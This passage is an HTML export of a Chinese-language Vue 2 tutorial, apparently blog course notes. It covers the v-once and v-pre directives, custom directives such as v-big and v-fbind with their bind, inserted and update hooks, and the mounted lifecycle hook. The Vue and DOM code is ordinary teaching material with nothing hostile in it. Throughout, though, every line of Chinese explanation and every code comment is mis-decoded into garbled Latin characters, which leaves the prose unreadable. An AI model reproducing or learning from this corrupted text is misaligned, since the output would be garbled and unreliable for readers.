class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-once</span>&gt;</span>åˆå§‹åŒ–çš„nå€¼æ˜¯: &#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰çš„nå€¼æ˜¯: &#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>ç‚¹æˆ‘n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123; <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>, <span class="hljs-attr">data</span>: &#123;<span class="hljs-attr">n</span>:<span class="hljs-number">1</span>&#125; &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-preæŒ‡ä»¤ ï¼š</strong>(æ¯”è¾ƒæ²¡ç”¨)</p><ul><li><p>è·³è¿‡å…¶æ‰€åœ¨èŠ‚ç‚¹çš„ç¼–è¯‘è¿‡ç¨‹</p></li><li><p>å¯åˆ©ç”¨å®ƒè·³è¿‡ï¼šæ²¡æœ‰ä½¿ç”¨æŒ‡ä»¤è¯­æ³•ã€æ²¡æœ‰ä½¿ç”¨æ’å€¼è¯­æ³•çš„èŠ‚ç‚¹ï¼Œä¼šåŠ å¿«ç¼–è¯‘</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-preæŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-pre</span>&gt;</span>Vueå…¶å®å¾ˆç®€å•<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> &gt;</span>å½“å‰çš„nå€¼æ˜¯:&#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>ç‚¹æˆ‘n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123; <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>, <span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">n</span>:<span class="hljs-number">1</span>&#125; &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-18-è‡ªå®šä¹‰æŒ‡ä»¤"><a href="#1-18-è‡ªå®šä¹‰æŒ‡ä»¤" class="headerlink" title="1.18 è‡ªå®šä¹‰æŒ‡ä»¤"></a>1.18 è‡ªå®šä¹‰æŒ‡ä»¤</h2><p>éœ€æ±‚1ï¼šå®šä¹‰ä¸€ä¸ªv-bigæŒ‡ä»¤ï¼Œå’Œv-textåŠŸèƒ½ç±»ä¼¼ï¼Œä½†ä¼šæŠŠç»‘å®šçš„æ•°å€¼æ”¾å¤§10å€ã€‚</p><p>éœ€æ±‚2ï¼šå®šä¹‰ä¸€ä¸ªv-fbindæŒ‡ä»¤ï¼Œå’Œv-bindåŠŸèƒ½ç±»ä¼¼ï¼Œä½†å¯ä»¥è®©å…¶æ‰€ç»‘å®šçš„inputå…ƒç´ é»˜è®¤è·å–ç„¦ç‚¹ã€‚</p><p><strong>è¯­æ³• ï¼š</strong></p><ol><li><p>å±€éƒ¨æŒ‡ä»¤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>  directives:&#123; <br>    æŒ‡ä»¤å:é…ç½®å¯¹è±¡ <br>  &#125;   <br>&#125;)<br><br>new Vue(&#123;<br>  directives:&#123; <br>    æŒ‡ä»¤å:å›è°ƒå‡½æ•° <br>  &#125;   <br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>å…¨å±€æŒ‡ä»¤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html">Vue.directive(æŒ‡ä»¤å, é…ç½®å¯¹è±¡)<br>æˆ–<br>Vue.directive(æŒ‡ä»¤å, å›è°ƒå‡½æ•°)<br><br><br>Vue.directive(&#x27;fbind&#x27;, &#123;<br>    // æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰<br>    bind(element, binding) &#123;// elementå°±æ˜¯DOMå…ƒç´ ï¼Œbindingå°±æ˜¯è¦ç»‘å®šçš„<br>      element.value = binding.value<br>    &#125;,<br>    // æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶<br>    inserted(element, binding) &#123;<br>      element.focus()<br>    &#125;,<br>    // æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶<br>    update(element, binding) &#123;<br>      element.value = binding.value<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>é…ç½®å¯¹è±¡ä¸­å¸¸ç”¨çš„3ä¸ªå›è°ƒå‡½æ•° <ul><li><p>bind(element, binding) æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶è°ƒç”¨</p></li><li><p>inserted(element, binding)æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶è°ƒç”¨</p></li><li><p>update(element, binding) æŒ‡ä»¤æ‰€åœ¨æ¨¡æ¿ç»“æ„è¢«é‡æ–°è§£ææ—¶è°ƒç”¨</p></li><li><p>elementå°±æ˜¯DOMå…ƒç´ ï¼Œbindingå°±æ˜¯è¦ç»‘å®šçš„å¯¹è±¡ï¼Œå®ƒåŒ…å«ä»¥ä¸‹å±æ€§ï¼š<code>name</code> <code>value</code> <code>expression</code> <code>arg</code> <code>modifiers</code></p></li><li><p>å¤‡æ³¨</p><ul><li><p>æŒ‡ä»¤å®šä¹‰æ—¶ä¸åŠ v-ï¼Œä½†ä½¿ç”¨æ—¶è¦åŠ v-</p></li><li><p>æŒ‡ä»¤åå¦‚æœæ˜¯å¤šä¸ªå•è¯ï¼Œè¦ä½¿ç”¨kebab-caseå‘½åæ–¹å¼ï¼Œä¸è¦ç”¨camelCaseå‘½å</p></li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>el: &#x27;#root&#x27;,<br>data: &#123;<br>n:1<br>&#125;,<br>directives: &#123;<br>&#x27;big-number&#x27;(element,binding) &#123;<br>element.innerText = binding.value * 10<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>å›é¡¾ä¸€ä¸ªDOMæ“ä½œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.demo</span>&#123;<span class="hljs-attribute">background-color</span>: orange;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>ç‚¹æˆ‘åˆ›å»ºä¸€ä¸ªè¾“å…¥æ¡†<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;btn&#x27;</span>)</span><br><span class="language-javascript">  btn.<span class="hljs-property">onclick</span> = <span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;input&#x27;</span>)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    input.<span class="hljs-property">className</span> = <span class="hljs-string">&#x27;demo&#x27;</span></span><br><span class="language-javascript">    input.<span class="hljs-property">value</span> = <span class="hljs-number">99</span></span><br><span class="language-javascript">    input.<span class="hljs-property">onclick</span> = <span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(input)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    input.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">    input.<span class="hljs-property">parentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;skyblue&#x27;</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p>éœ€æ±‚1ï¼šå®šä¹‰ä¸€ä¸ªv-bigæŒ‡ä»¤ï¼Œå’Œv-textåŠŸèƒ½ç±»ä¼¼ï¼Œä½†ä¼šæŠŠç»‘å®šçš„æ•°å€¼æ”¾å¤§10å€ã€‚</p><p>éœ€æ±‚2ï¼šå®šä¹‰ä¸€ä¸ªv-fbindæŒ‡ä»¤ï¼Œå’Œv-bindåŠŸèƒ½ç±»ä¼¼ï¼Œä½†å¯ä»¥è®©å…¶æ‰€ç»‘å®šçš„inputå…ƒç´ é»˜è®¤è·å–ç„¦ç‚¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è‡ªå®šä¹‰æŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰çš„nå€¼æ˜¯ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- &lt;h2&gt;æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-big</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>ç‚¹æˆ‘n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-fbind:value</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// å®šä¹‰å…¨å±€æŒ‡ä»¤</span></span><br><span class="language-javascript">  <span class="hljs-comment">/* Vue.directive(&#x27;fbind&#x27;,&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">// æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰</span></span><br><span class="hljs-comment"><span class="language-javascript">bind(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.value = binding.value</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">// æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶</span></span><br><span class="hljs-comment"><span class="language-javascript">inserted(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.focus()</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">// æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶</span></span><br><span class="hljs-comment"><span class="language-javascript">update(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.value = binding.value</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;) */</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">n</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">directives</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// bigå‡½æ•°ä½•æ—¶ä¼šè¢«è°ƒç”¨ï¼Ÿ</span></span><br><span class="language-javascript">      <span class="hljs-comment">// 1.æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰ 2.æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶</span></span><br><span class="language-javascript">      <span class="hljs-comment">/* &#x27;big-number&#x27;(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">// console.log(&#x27;big&#x27;)</span></span><br><span class="hljs-comment"><span class="language-javascript">element.innerText = binding.value * 10</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;, */</span></span><br><span class="language-javascript">      <span class="hljs-title function_">big</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;big&#x27;</span>, <span class="hljs-variable language_">this</span>) <span class="hljs-comment">// ğŸ”´æ³¨æ„æ­¤å¤„çš„ this æ˜¯ window</span></span><br><span class="language-javascript">        <span class="hljs-comment">// console.log(&#x27;big&#x27;)</span></span><br><span class="language-javascript">        element.<span class="hljs-property">innerText</span> = binding.<span class="hljs-property">value</span> * <span class="hljs-number">10</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">fbind</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰</span></span><br><span class="language-javascript">        <span class="hljs-title function_">bind</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶</span></span><br><span class="language-javascript">        <span class="hljs-title function_">inserted</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶</span></span><br><span class="language-javascript">        <span class="hljs-title function_">update</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-19-ç”Ÿå‘½å‘¨æœŸ"><a href="#1-19-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="1.19 ç”Ÿå‘½å‘¨æœŸ"></a>1.19 ç”Ÿå‘½å‘¨æœŸ</h2><ol><li><p>åˆåç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°ã€ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€ç”Ÿå‘½å‘¨æœŸé’©å­</p></li><li><p>æ˜¯ä»€ä¹ˆï¼šVueåœ¨å…³é”®æ—¶åˆ»å¸®æˆ‘ä»¬è°ƒç”¨çš„ä¸€äº›ç‰¹æ®Šåç§°çš„å‡½æ•°</p></li><li><p>ç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„åå­—ä¸å¯æ›´æ”¹ï¼Œä½†å‡½æ•°çš„å…·ä½“å†…å®¹æ˜¯ç¨‹åºå‘˜æ ¹æ®éœ€æ±‚ç¼–å†™çš„</p></li><li><p>ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­çš„ this æŒ‡å‘æ˜¯vmæˆ–ç»„ä»¶å®ä¾‹å¯¹è±¡</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å¼•å‡ºç”Ÿå‘½å‘¨æœŸ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>ä½ å¥½å•Š<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>çœ‹ç¬”è®°å­¦Vue<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">a</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// ğŸ”´Vue å®Œæˆæ¨¡æ¿çš„è§£æå¹¶æŠŠåˆå§‹çš„çœŸå® DOM å…ƒç´ æ”¾å…¥é¡µé¢åï¼ˆæŒ‚è½½å®Œæ¯•ï¼‰è°ƒç”¨ mounted</span></span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">      <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> -= <span class="hljs-number">0.01</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-number">1</span></span><br><span class="language-javascript">      &#125;, <span class="hljs-number">16</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// é€šè¿‡å¤–éƒ¨çš„å®šæ—¶å™¨å®ç°ï¼ˆä¸æ¨èï¼‰</span></span><br><span class="language-javascript">  <span class="hljs-comment">// setInterval(() =&gt; &#123;</span></span><br><span class="language-javascript">  <span class="hljs-comment">// vm.opacity -= 0.01</span></span><br><span class="language-javascript">  <span class="hljs-comment">// if(vm.opacity &lt;= 0) vm.opacity = 1</span></span><br><span class="language-javascript">  <span class="hljs-comment">// &#125;,16)</span></span><br><span class="language-javascript"></span><span 